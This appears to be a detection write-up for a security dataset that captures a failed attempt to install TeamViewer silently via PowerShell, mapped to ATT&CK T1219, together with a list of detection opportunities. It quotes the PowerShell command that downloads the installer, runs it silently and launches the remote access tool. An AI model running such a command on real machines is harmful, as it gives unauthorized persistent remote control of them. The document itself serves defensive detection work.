# T1219-1: Remote Access Tools — TeamViewer Files Detected Test on Windows

## Technique Context

T1219 (Remote Access Tools) represents adversary use of legitimate remote access software to maintain persistence and control over compromised systems. TeamViewer is one of the most commonly abused RATs by threat actors due to its legitimate business use, making malicious activity blend in with normal operations. Attackers often deploy TeamViewer to establish persistent remote access, bypass network controls that might block custom backdoors, and operate under the cover of legitimate administrative tools.

The detection community focuses on identifying unauthorized TeamViewer installations, monitoring for suspicious download patterns, tracking process execution chains that install remote access tools, and correlating RAT activity with other compromise indicators. Key detection points include installation artifacts, network connections to RAT infrastructure, and behavioral anomalies around remote access tool usage.

## What This Dataset Contains

This dataset captures a failed TeamViewer installation attempt executed via PowerShell. The core activity is contained in Security event 4688 showing the PowerShell command execution:

```
"powershell.exe" & {Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
$file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
Start-Process -Wait $file1 /S; 
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'}
```

Sysmon captures the full process tree starting with the parent PowerShell process (PID 26332) creating a child PowerShell process (PID 32588) to execute the TeamViewer installation script. The dataset includes:

- DNS resolution for `download.teamviewer.com` (Sysmon EID 22)
- PowerShell script block logging showing the complete installation command (EID 4104)
- Multiple PowerShell errors indicating the download and installation failed due to path issues
- Process creation events showing whoami.exe execution for discovery
- Image load events capturing .NET runtime and Windows Defender module loading

The PowerShell logs reveal the technique failed because the system account doesn't have a Desktop folder: "Could not find a part of the path 'C:\Users\ACME-WS02$\Desktop\TeamViewer_Setup.exe'."

## What This Dataset Does Not Contain

The dataset lacks successful TeamViewer installation artifacts because the technique failed at the download stage. Missing elements include:

- The actual TeamViewer executable file (download failed due to invalid path)
- Registry modifications that would occur during successful TeamViewer installation
- Network connections to TeamViewer infrastructure beyond DNS resolution
- File system artifacts like TeamViewer configuration files, logs, or service binaries
- Service installation events that normally accompany TeamViewer deployment
- Process creation events for the TeamViewer processes themselves

The Sysmon configuration's include-mode filtering means we only see PowerShell and whoami.exe process creation events, not any intermediate processes that might have been spawned during installation attempts.

## Assessment

This dataset provides excellent telemetry for detecting TeamViewer installation attempts, even failed ones. The combination of Security event command-line logging, PowerShell script block logging, and Sysmon process/network events gives comprehensive coverage of the attack chain. The DNS query for download.teamviewer.com and the full PowerShell command containing the TeamViewer download URL are particularly valuable detection artifacts.

While the technique failed, the telemetry demonstrates how defenders can catch RAT deployment attempts before they succeed. The verbose PowerShell error logging actually enhances the dataset's detection value by showing exactly how the technique failed. This pattern would be similar for successful installations, just without the error messages.

## Detection Opportunities Present in This Data

1. **DNS queries to TeamViewer infrastructure** - Monitor EID 22 for queries to `download.teamviewer.com` and other TeamViewer domains
2. **PowerShell commands containing RAT download URLs** - Detect Security EID 4688 command lines with `https://download.teamviewer.com/download/TeamViewer_Setup.exe`
3. **PowerShell script blocks attempting to download and install remote access tools** - Monitor PowerShell EID 4104 for patterns like `Invoke-WebRequest -OutFile` combined with TeamViewer URLs
4. **Process execution chains from PowerShell to remote access tool installers** - Track parent-child relationships where PowerShell spawns processes with RAT-related file paths
5. **Silent installation command patterns** - Detect command lines containing `/S` flag combined with executable names suggesting remote access tools
6. **Automated remote access tool execution attempts** - Monitor for `Start-Process` commands targeting common RAT installation paths like `C:\Program Files (x86)\TeamViewer\`
7. **URL pattern matching for common RAT download locations** - Create signatures for legitimate RAT vendor domains being accessed via scripting engines
8. **PowerShell error patterns indicating failed RAT installations** - Monitor PowerShell error logs for failed file operations involving known RAT paths
